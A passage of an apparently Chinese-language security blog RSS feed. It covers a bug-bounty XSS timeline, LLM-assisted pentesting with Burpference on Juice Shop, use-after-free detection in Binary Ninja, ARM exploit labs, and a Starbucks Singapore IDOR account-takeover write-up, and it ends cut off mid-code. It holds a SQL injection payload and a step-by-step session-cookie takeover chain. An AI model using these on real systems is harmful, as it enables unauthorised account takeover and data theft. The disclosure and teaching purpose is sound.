&lt;li&gt;&lt;strong&gt;6月11日12:04&lt;/strong&gt;：MainWP团队建议清除缓存并重新测试&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;6月11日21:41&lt;/strong&gt;：研究人员确认在非Chrome浏览器中漏洞已修复&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;6月13日&lt;/strong&gt;：所有五个相关漏洞被标记为已解决，并向研究人员支付50美元奖金&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;6月17日&lt;/strong&gt;：漏洞报告被公开披露&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;技术细节&#34;&gt;技术细节
&lt;/h2&gt;&lt;p&gt;漏洞类型：反射型跨站脚本(XSS)
CVE ID：无
严重程度：低(2.2)
赏金金额：50美元&lt;/p&gt;
</description>
        </item>
        <item>
        <title>人工智能增强渗透测试方法论（第一部分）：Burpference插件实战</title>
        <link>http://localhost:1313/p/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%A2%9E%E5%BC%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95%E8%AE%BA%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86burpference%E6%8F%92%E4%BB%B6%E5%AE%9E%E6%88%98/</link>
        <pubDate>Wed, 06 Aug 2025 12:35:41 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%A2%9E%E5%BC%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95%E8%AE%BA%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86burpference%E6%8F%92%E4%BB%B6%E5%AE%9E%E6%88%98/</guid>
        <description>&lt;h3 id=&#34;人工智能与渗透测试的初次碰撞&#34;&gt;人工智能与渗透测试的初次碰撞
&lt;/h3&gt;&lt;p&gt;作为前软件开发者和红队成员，我（Craig Vincent）长期认为AI在渗透测试领域华而不实，直到同事Derek Banks推荐了Burpference——这款Burp Suite插件能将Web请求/响应发送给大语言模型进行安全分析。&lt;/p&gt;
&lt;h3 id=&#34;技术实现详解&#34;&gt;技术实现详解
&lt;/h3&gt;&lt;h4 id=&#34;环境搭建&#34;&gt;环境搭建
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Jython配置&lt;/strong&gt;：使用2.7.4版本Jython standalone JAR（注意2.7.3版本存在内存视图接口错误）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;本地模型部署&lt;/strong&gt;：在实验环境的老旧游戏PC上通过Ollama运行70亿参数的deepseek-r1模型&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;网络调优&lt;/strong&gt;：通过设置&lt;code&gt;OLLAMA_HOST=0.0.0.0&lt;/code&gt;解决跨主机通信问题&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;工作流程&#34;&gt;工作流程
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;目标界定&lt;/strong&gt;：将OWASP Juice Shop漏洞演练平台纳入Burp Suite作用域&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;AI分析触发&lt;/strong&gt;：插件自动将符合作用域的流量发送至LLM，附带标准化分析指令：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;你作为渗透测试专家需要评估：
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- 请求/响应中的安全配置错误
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- 认证与会话管理缺陷
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- 输入验证漏洞（如XSS/SQLi）
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;需按CRITICAL/HIGH/MEDIUM/LOW/INFORMATIONAL分级报告
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;实战发现&#34;&gt;实战发现
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Cookie异常&lt;/strong&gt;：模型识别出&lt;code&gt;welcomebanner_status=dismiss&lt;/code&gt;的可疑cookie并推测攻击向量&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;XSS误报&lt;/strong&gt;：GPT-4o-mini模型提供的PoC触发500错误，实际为误判&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;SQL注入成功&lt;/strong&gt;：模型从错误消息中发现SQL语法，最终通过&lt;code&gt;&#39; OR 1=1--&lt;/code&gt;载荷成功获取数据库信息&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;性能对比&#34;&gt;性能对比
&lt;/h3&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;模型类型&lt;/th&gt;
          &lt;th&gt;响应速度&lt;/th&gt;
          &lt;th&gt;漏洞发现能力&lt;/th&gt;
          &lt;th&gt;数据隐私&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;本地7B参数模型&lt;/td&gt;
          &lt;td&gt;慢(2-3秒/请求)&lt;/td&gt;
          &lt;td&gt;基础cookie分析&lt;/td&gt;
          &lt;td&gt;完全可控&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;GPT-4o-mini&lt;/td&gt;
          &lt;td&gt;快(&amp;lt;500ms)&lt;/td&gt;
          &lt;td&gt;能识别CORS/SQLi等复杂漏洞&lt;/td&gt;
          &lt;td&gt;需考虑数据外泄风险&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;改进建议&#34;&gt;改进建议
&lt;/h3&gt;&lt;p&gt;当前单请求分析模式存在上下文缺失问题，未来可扩展为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;会话序列分析功能&lt;/li&gt;
&lt;li&gt;自定义上下文窗口大小&lt;/li&gt;
&lt;li&gt;自动化PoC验证模块&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;该插件尤其适用于Web应用测试初期的手动枚举阶段，相当于配备了一位不知疲倦的助手。在Part 2中，我们将探讨Copilot在渗透测试中的进阶应用。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>使用Binary Ninja API检测潜在释放后使用漏洞的技术解析</title>
        <link>http://localhost:1313/p/%E4%BD%BF%E7%94%A8binary-ninja-api%E6%A3%80%E6%B5%8B%E6%BD%9C%E5%9C%A8%E9%87%8A%E6%94%BE%E5%90%8E%E4%BD%BF%E7%94%A8%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Wed, 06 Aug 2025 11:46:22 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BD%BF%E7%94%A8binary-ninja-api%E6%A3%80%E6%B5%8B%E6%BD%9C%E5%9C%A8%E9%87%8A%E6%94%BE%E5%90%8E%E4%BD%BF%E7%94%A8%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h2 id=&#34;释放后使用漏洞的静态检测挑战&#34;&gt;释放后使用漏洞的静态检测挑战
&lt;/h2&gt;&lt;p&gt;释放后使用(Use-after-Free)是一种内存破坏条件，程序在内存被释放后仍继续引用。静态检测这类漏洞具有挑战性。本文探索了利用Binary Ninja的中级中间语言(MLIL)建立数据流图的方法，通过追踪特定内存分配与其他内存区域的交互关系，进行跨函数分析以识别潜在漏洞。&lt;/p&gt;
&lt;h2 id=&#34;内存分配数据流图构建&#34;&gt;内存分配数据流图构建
&lt;/h2&gt;&lt;p&gt;数据流图由四种节点类型构成：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;追踪分配节点(红色)&lt;/strong&gt;：表示待追踪的内存分配&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;函数栈帧节点(绿色)&lt;/strong&gt;：表示函数调用栈帧&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;动态内存节点(蓝色)&lt;/strong&gt;：表示无法确定来源的SSA变量&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;全局内存节点(黑色)&lt;/strong&gt;：表示函数内的全局变量&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;边表示指针存储操作，包含两个关键属性：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;write&lt;/code&gt;：写入位置相对于分配基址的偏移&lt;/li&gt;
&lt;li&gt;&lt;code&gt;points&lt;/code&gt;：指针值指向的目标偏移&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;ssa变量与图节点的映射关系&#34;&gt;SSA变量与图节点的映射关系
&lt;/h2&gt;&lt;p&gt;分析从分配函数(如malloc())返回值的SSA变量开始追踪。通过Binary Ninja的&lt;code&gt;get_ssa_var_definition()&lt;/code&gt;和&lt;code&gt;get_ssa_var_uses()&lt;/code&gt;API可以获取变量的定义位置和使用链。指针算术运算时会额外存储偏移信息。&lt;/p&gt;
&lt;h2 id=&#34;内存加载操作转换为图边&#34;&gt;内存加载操作转换为图边
&lt;/h2&gt;&lt;p&gt;当遇到函数外部内存加载操作时，会假设相关存储操作发生在函数外部，并据此创建图边。内存存储、赋值和加载操作共同构成了数据流图的基础构件。&lt;/p&gt;
&lt;h2 id=&#34;数据流图信息传播&#34;&gt;数据流图信息传播
&lt;/h2&gt;&lt;p&gt;变量赋值分为三种情况处理：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;直接变量赋值：简单传递源变量值&lt;/li&gt;
&lt;li&gt;含指针算术的赋值：更新偏移信息&lt;/li&gt;
&lt;li&gt;内存加载赋值：通过图边解析目标节点&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;释放后使用漏洞检测&#34;&gt;释放后使用漏洞检测
&lt;/h2&gt;&lt;p&gt;完成数据流图构建后，分析所有被标记为&amp;quot;Free&amp;quot;的基本块，检查是否存在路径通向&amp;quot;Use&amp;quot;块。同时也会检测从一个&amp;quot;Free&amp;quot;块到另一个&amp;quot;Free&amp;quot;块的路径，以发现潜在的双重释放问题。&lt;/p&gt;
&lt;h2 id=&#34;分配器释放器函数的自动识别&#34;&gt;分配器/释放器函数的自动识别
&lt;/h2&gt;&lt;p&gt;通过分析标准函数(如malloc/free)的使用链，可以识别程序特定的包装函数。对于释放器函数，检查函数参数是否直接传递给free()等标准释放函数。&lt;/p&gt;
&lt;h2 id=&#34;实际漏洞案例分析&#34;&gt;实际漏洞案例分析
&lt;/h2&gt;&lt;p&gt;工具在多个历史漏洞中成功检测出问题，包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;JasPer JPEG-2000中的双重释放(CVE-2015-5221)&lt;/li&gt;
&lt;li&gt;Giflib中的双重释放(CVE-2016-3177)&lt;/li&gt;
&lt;li&gt;GNOME-Nettool中的释放后使用&lt;/li&gt;
&lt;li&gt;OpenSLP中的跨函数双重释放(CVE-2015-5177)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;结论与展望&#34;&gt;结论与展望
&lt;/h2&gt;&lt;p&gt;本文介绍的方法虽然存在静态分析固有的分类误差，但为识别释放后使用漏洞提供了有效途径。未来可通过改进日志分组和增加全局内存跟踪来增强工具实用性。项目源代码已公开在uafninja仓库。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>ARM漏洞开发实验室技术专题：从基础到实战</title>
        <link>http://localhost:1313/p/arm%E6%BC%8F%E6%B4%9E%E5%BC%80%E5%8F%91%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%BB%8E%E5%9F%BA%E7%A1%80%E5%88%B0%E5%AE%9E%E6%88%98/</link>
        <pubDate>Wed, 06 Aug 2025 10:28:58 +0800</pubDate>
        
        <guid>http://localhost:1313/p/arm%E6%BC%8F%E6%B4%9E%E5%BC%80%E5%8F%91%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%BB%8E%E5%9F%BA%E7%A1%80%E5%88%B0%E5%AE%9E%E6%88%98/</guid>
        <description>&lt;h1 id=&#34;arm漏洞开发实验室登陆44con伦敦2016&#34;&gt;ARM漏洞开发实验室登陆44CON伦敦2016
&lt;/h1&gt;&lt;p&gt;随着互联网重心向ARM设备（移动和物联网）转移，ARM漏洞开发正成为攻防安全从业者必备的重要技能。&lt;/p&gt;
&lt;p&gt;我们首次在CanSecWest 2016推出ARM漏洞实验室，随后在SyScan和HITB2016AMS进行巡讲。今年我们将为44CON带来为期3天的特别培训课程，内容涵盖：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ARM汇编语言基础&lt;/li&gt;
&lt;li&gt;ARM架构下的函数工作原理&lt;/li&gt;
&lt;li&gt;ARM栈溢出漏洞利用&lt;/li&gt;
&lt;li&gt;ARM Shellcode编写技巧&lt;/li&gt;
&lt;li&gt;绕过ARM的XN（不可执行内存）保护&lt;/li&gt;
&lt;li&gt;ARM返回导向编程(ROP)&lt;/li&gt;
&lt;li&gt;突破ARM的ASLR防护&lt;/li&gt;
&lt;li&gt;实战案例：从固件分析到完全控制——某ARM路由器的完整漏洞利用过程&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;44CON开幕在即，报名请访问大会培训注册页面。下月伦敦见！
—— Saumil&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;arm-x框架与全新物联网ctf挑战赛&#34;&gt;ARM-X框架与全新物联网CTF挑战赛
&lt;/h1&gt;&lt;p&gt;近日发布的ARM-X固件仿真框架可构建接近真实的物联网虚拟环境，主要应用于：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;物联网设备仿真与渗透测试&lt;/li&gt;
&lt;li&gt;ARM物联网漏洞开发教学&lt;/li&gt;
&lt;li&gt;物联网目标模糊测试&lt;/li&gt;
&lt;li&gt;物联网CTF竞赛平台&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;预览版VM包含两个仿真设备：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DVAR漏洞路由器（原TinysploitARM）&lt;/li&gt;
&lt;li&gt;Trivision 227WF IP摄像头&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;CTF挑战赛要求参赛者分析IP摄像头的三个已知漏洞，首个提交有效利用方案及分析报告者将获赠&amp;quot;0-day漏洞礼盒&amp;quot;。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;dvar路由器rop挑战赛升级版&#34;&gt;DVAR路由器ROP挑战赛升级版
&lt;/h1&gt;&lt;p&gt;在完成基础栈溢出练习后解锁进阶挑战：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;分析&amp;quot;/usr/bin/lightsrv&amp;quot;交通信号服务的栈溢出漏洞&lt;/li&gt;
&lt;li&gt;实现pc=0x41414140的崩溃控制&lt;/li&gt;
&lt;li&gt;构建完整ROP链（启用XN保护）&lt;/li&gt;
&lt;li&gt;最终获取shell&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;内存布局提示：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00010000-00012000 r-xp /usr/bin/lightsrv
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;40000000-40064000 r-xp /lib/libc.so
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;befdf000-bf000000 rw-p [stack]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr&gt;
&lt;h1 id=&#34;dvar漏洞路由器发布&#34;&gt;DVAR漏洞路由器发布
&lt;/h1&gt;&lt;p&gt;这款仿真ARM路由器运行存在漏洞的web服务，包含：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;基于QEMU的完整ARM架构仿真&lt;/li&gt;
&lt;li&gt;预置tinysploitARM虚拟机镜像（47.4MB）&lt;/li&gt;
&lt;li&gt;从固件分析到漏洞利用的完整训练环境&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;下载SHA256校验：
bc6eb66b7f5c0c71ca418c809213eb452e3fbf90654856ebb0591e164d634e2b&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;特别技术培训通告&#34;&gt;特别技术培训通告
&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;维也纳DEEPSEC2017：首次举办3天ARM物联网漏洞实验室&lt;/li&gt;
&lt;li&gt;44CON伦敦：新增ARM/Linux物联网设备实战内容&lt;/li&gt;
&lt;li&gt;Blackhat USA 2017：
&lt;ul&gt;
&lt;li&gt;初级班：ARM汇编基础/远程漏洞利用&lt;/li&gt;
&lt;li&gt;高级班：对抗XN/ASLR防护/固件分析/真实硬件攻击&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;课程链接：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://cansecwest.com/dojos/2019/exploitlab.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://cansecwest.com/dojos/2019/exploitlab.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://conference.hitb.org/hitbsecconf2019ams/sessions/3-day-training-1-the-arm-exploit-laboratory/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://conference.hitb.org/hitbsecconf2019ams/sessions/3-day-training-1-the-arm-exploit-laboratory/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>星巴克新加坡站6000美元账户接管漏洞：IDOR攻击剖析</title>
        <link>http://localhost:1313/p/%E6%98%9F%E5%B7%B4%E5%85%8B%E6%96%B0%E5%8A%A0%E5%9D%A1%E7%AB%996000%E7%BE%8E%E5%85%83%E8%B4%A6%E6%88%B7%E6%8E%A5%E7%AE%A1%E6%BC%8F%E6%B4%9Eidor%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90/</link>
        <pubDate>Wed, 06 Aug 2025 08:39:14 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%98%9F%E5%B7%B4%E5%85%8B%E6%96%B0%E5%8A%A0%E5%9D%A1%E7%AB%996000%E7%BE%8E%E5%85%83%E8%B4%A6%E6%88%B7%E6%8E%A5%E7%AE%A1%E6%BC%8F%E6%B4%9Eidor%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;侦察阶段&#34;&gt;侦察阶段
&lt;/h3&gt;&lt;p&gt;在浏览星巴克新加坡站时，我发现某个页面加载了第三方站点（暂称example.com）的内容。经调查发现card.starbucks.com.sg的登录页面存在于example.com/starbucks目录下，存在两种可能性：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;该应用可能是card.starbucks.com.sg的开发和测试环境&lt;/li&gt;
&lt;li&gt;或是已废弃的旧测试环境&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;通过在生产环境创建测试账户并成功登录example.com/starbucks，确认两个应用使用相同的认证机制。&lt;/p&gt;
&lt;h3 id=&#34;漏洞利用&#34;&gt;漏洞利用
&lt;/h3&gt;&lt;p&gt;在测试环境发现一个生产环境不存在的端点，其POST参数为：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;email=hacker@hacker.com 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;当填入目标邮箱时，可在个人资料页看到该账户的部分信息。由于测试环境生成的CSRF令牌无效，无法直接修改密码。通过将测试环境的PHPSESSID cookie复制到生产环境后：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;成功查看受害者完整信息&lt;/li&gt;
&lt;li&gt;利用生产环境有效的CSRF令牌修改密码&lt;/li&gt;
&lt;li&gt;实现账户完全接管&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;影响范围&#34;&gt;影响范围
&lt;/h3&gt;&lt;p&gt;攻击者可：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;查看用户所有个人信息&lt;/li&gt;
&lt;li&gt;完全控制账户&lt;/li&gt;
&lt;li&gt;通过移动应用消费账户内存储的星礼卡余额&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;漏洞链扩展&#34;&gt;漏洞链扩展
&lt;/h3&gt;&lt;p&gt;在example.com发现另外两个测试环境：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;starbucks2：禁止新用户注册&lt;/li&gt;
&lt;li&gt;starbucks3：可创建新账户&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;通过分析得出：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;starbucks2/starbucks3使用独立测试用户表&lt;/li&gt;
&lt;li&gt;starbucks3创建的账户可登录starbucks2&lt;/li&gt;
&lt;li&gt;starbucks2的PHPSESSID在生产环境有效&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最终构建攻击链：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在starbucks3用受害者邮箱创建傀儡账户（写入testusers表）&lt;/li&gt;
&lt;li&gt;在starbucks2通过相同端点将该邮箱与自己账户关联（绑定PHPSESSID到测试用户表）&lt;/li&gt;
&lt;li&gt;复制PHPSESSID到生产环境接管真实账户&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;时间线&#34;&gt;时间线
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;5月17日：提交报告&lt;/li&gt;
&lt;li&gt;5月18日：分类处理&lt;/li&gt;
&lt;li&gt;5月20日：获4000美元赏金&lt;/li&gt;
&lt;li&gt;6月17日：追加2000美元（1.5倍奖励）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://hackerone.com/reports/xxx&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;原始漏洞报告&lt;/a&gt; | 关注作者Twitter获取更多安全研究内容&lt;/p&gt;
</description>
        </item>
        <item>
        <title>GnuTLS与OpenSSL类型混淆漏洞分析</title>
        <link>http://localhost:1313/p/gnutls%E4%B8%8Eopenssl%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
        <pubDate>Wed, 06 Aug 2025 06:54:28 +0800</pubDate>
        
        <guid>http://localhost:1313/p/gnutls%E4%B8%8Eopenssl%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;gnutls-curlinfo_tls_session--curlinfo_tls_ssl_ptr-类型混淆&#34;&gt;GnuTLS CURLINFO_TLS_SESSION / CURLINFO_TLS_SSL_PTR 类型混淆
&lt;/h1&gt;&lt;h2 id=&#34;漏洞摘要&#34;&gt;漏洞摘要
&lt;/h2&gt;&lt;p&gt;curl_easy_getinfo函数在处理CURLINFO_TLS_SESSION和CURLINFO_TLS_SSL_PTR时，错误地将GnuTLS后端标识为CURLSSLBACKEND_OPENSSL，导致类型混淆问题。&lt;/p&gt;
&lt;h2 id=&#34;技术细节&#34;&gt;技术细节
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;curl_tlssessioninfo&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;curl_sslbackend&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;backend&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;internals&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;漏洞位于vquic-tls.c文件第211行：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#elif defined(USE_GNUTLS)
